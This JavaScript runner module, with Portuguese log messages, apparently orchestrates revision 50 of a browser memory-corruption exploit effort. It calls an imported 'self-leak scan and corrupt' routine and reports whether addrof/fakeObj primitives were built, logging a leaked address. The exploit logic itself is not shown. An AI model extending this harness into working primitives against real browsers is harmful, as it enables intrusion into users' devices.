// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisão 50 - Self-Leak Scan)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeSelfLeakScanAndCorrupt_R50,
    FNAME_MODULE_SELF_LEAK_SCAN_R50
} from './testArrayBufferVictimCrash.mjs';

async function runSelfLeakScan_R50() {
    const FNAME_RUNNER = "runSelfLeakScan_R50";
    logS3(`==== INICIANDO Estratégia de Self-Leak e Busca (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeSelfLeakScanAndCorrupt_R50();
    const module_name_for_title = FNAME_MODULE_SELF_LEAK_SCAN_R50;

    if (!result) {
        logS3(`  RUNNER R50: Teste retornou resultado inválido.`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Invalid Result!`;
        return;
    }

    if (result.errorOccurred) {
        logS3(`  RUNNER R50: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result.success) {
        logS3(`  RUNNER R50: SUCESSO! Primitivas Addrof/FakeObj construídas.`, "vuln", FNAME_RUNNER);
        logS3(`  RUNNER R50: Addrof(leaked_obj) => ${result.leaked_addr}`, "leak", FNAME_RUNNER);
        logS3(`  RUNNER R50: FakeObj(test_addr) => ${result.fake_obj_test_result}`, "good", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Addrof/FakeObj SUCCESS!`;
    } else {
        logS3(`  RUNNER R50: FALHA na construção das primitivas.`, "error", FNAME_RUNNER);
        logS3(`  RUNNER R50: Detalhes: ${result.msg}`, "warn", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Primitive Fail!`;
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Self-Leak e Busca (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_SELF_LEAK_SCAN_R50}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R50 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runSelfLeakScan_R50();

    logS3(`\n==== Script 3 R50 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
